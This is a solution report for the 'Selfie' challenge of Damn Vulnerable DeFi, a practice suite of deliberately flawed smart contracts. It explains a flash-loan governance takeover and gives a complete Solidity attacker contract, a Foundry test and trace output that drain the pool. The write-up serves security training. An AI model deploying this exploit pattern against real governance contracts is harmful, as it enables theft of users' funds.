# Damn Vulnerable DeFi - Selfie - Solution Report

## Problem Analysis

### Contract Summary

The challenge involves three main contracts:

1. `DamnValuableVotes`: An ERC20 token with voting capabilities.
2. `SimpleGovernance`: A governance contract that allows actions to be queued and executed based on voting power.
3. `SelfiePool`: A flash loan provider for the DamnValuableVotes token.

Key functions:

- `SelfiePool.flashLoan()`: Provides flash loans of DVT tokens.
- `SimpleGovernance.queueAction()`: Queues a governance action if the caller has enough voting power.
- `SimpleGovernance.executeAction()`: Executes a queued action after a delay.
- `SelfiePool.emergencyExit()`: Allows the governance to withdraw all funds from the pool.

### Initial Setup

- Total DVT token supply: 2,000,000 tokens
- Tokens in SelfiePool: 1,500,000 tokens
- Player's initial balance: 0 tokens

### Success Criteria

To solve the challenge, the player must:

1. Drain all 1,500,000 DVT tokens from the SelfiePool.
2. Transfer the drained tokens to the designated recovery address.

The challenge is considered solved when:

- The SelfiePool's token balance is 0.
- The recovery address's token balance is 1,500,000 DVT tokens.

## Vulnerability

The main vulnerability in this challenge stems from the interaction between the flash loan functionality and the governance system. Specifically:

1. Lack of snapshot mechanism in voting power:
   In the `SimpleGovernance` contract, the `_hasEnoughVotes` function checks the current voting power:

   ```solidity
   function _hasEnoughVotes(address who) private view returns (bool) {
       uint256 balance = _votingToken.getVotes(who);
       uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
       return balance > halfTotalSupply;
   }
   ```

   This check is performed at the time of queueing an action, without considering whether the voting power is temporary (e.g., from a flash loan).

2. Unrestricted emergency exit:
   The `SelfiePool` contract has an `emergencyExit` function that can drain all funds:

   ```solidity
   function emergencyExit(address receiver) external onlyGovernance {
       uint256 amount = token.balanceOf(address(this));
       token.transfer(receiver, amount);

       emit EmergencyExit(receiver, amount);
   }
   ```

   This function is only restricted by the `onlyGovernance` modifier, making it a prime target for exploitation if governance control can be momentarily seized.

3. No delay in voting power activation:
   The `DamnValuableVotes` token allows immediate use of voting power after receiving tokens, without any delay or lock period.

## Attack Pattern

The attack to drain the SelfiePool can be executed in the following steps:

1. Flash Loan and Governance Action Queueing:

   - Deploy an attacker contract that implements the `IERC3156FlashBorrower` interface.
   - Call the attacker contract to initiate a flash loan from SelfiePool for the maximum amount of DVT tokens (1,500,000).
   - In the `onFlashLoan` callback:
     a. Delegate the voting power of the borrowed tokens to the attacker contract.
     b. Queue a governance action in SimpleGovernance to call `emergencyExit` on SelfiePool.
     c. Approve SelfiePool to take back the borrowed tokens.
   - Return the flash loan.

   Consequence: A malicious governance action is queued with temporarily borrowed voting power.

2. Waiting Period:

   - Wait for the governance delay period (2 days) to pass.

   Consequence: The queued action becomes eligible for execution.

3. Action Execution:

   - After the delay period, call the attacker contract to execute the queued governance action.
   - This will trigger the `emergencyExit` function on SelfiePool, transferring all DVT tokens to the designated recovery address.

   Consequence: All 1,500,000 DVT tokens are drained from SelfiePool and sent to the recovery address.

## Proof of Concept (PoC)

The following code demonstrates the implementation of the attack pattern:

1. Attacker Contract Implementation:

```solidity
contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    DamnValuableVotes private immutable token;
    address private immutable recovery;
    uint256 public actionId;

    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _recovery) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    function initiateAttack() external {
        uint256 borrowAmount = pool.maxFlashLoan(address(token));
        pool.flashLoan(this, address(token), borrowAmount, "");
    }

    function onFlashLoan(address initiator, address tokenAddress, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        require(tokenAddress == address(token), "Unexpected token");

        // Delegate voting power to ourselves
        token.delegate(address(this));

        // Queue the governance action to drain the pool directly to the recovery address
        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", recovery));

        // Approve the pool to take back the flash loan
        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeDrainAction() external {
        governance.executeAction(actionId);
    }
}
```

2. Attack Execution in Test Contract:

```solidity
function test_selfie() public checkSolvedByPlayer {
    // Deploy the attacker contract
    SelfieAttacker attacker = new SelfieAttacker(pool, governance, token, recovery);

    // Step 1: Perform the flash loan attack and queue the action
    attacker.initiateAttack();

    // Step 2: Fast forward time to bypass the governance delay
    vm.warp(block.timestamp + governance.getActionDelay());

    // Step 3: Execute the governance action to drain the pool directly to the recovery address
    attacker.executeDrainAction();
}
```

3. Foundry Traces

```
    ├─ [563] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]
    │   └─ ← [Return]
    ├─ [563] DamnValuableVotes::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    ├─ [0] VM::assertEq(1500000000000000000000000 [1.5e24], 1500000000000000000000000 [1.5e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]
```
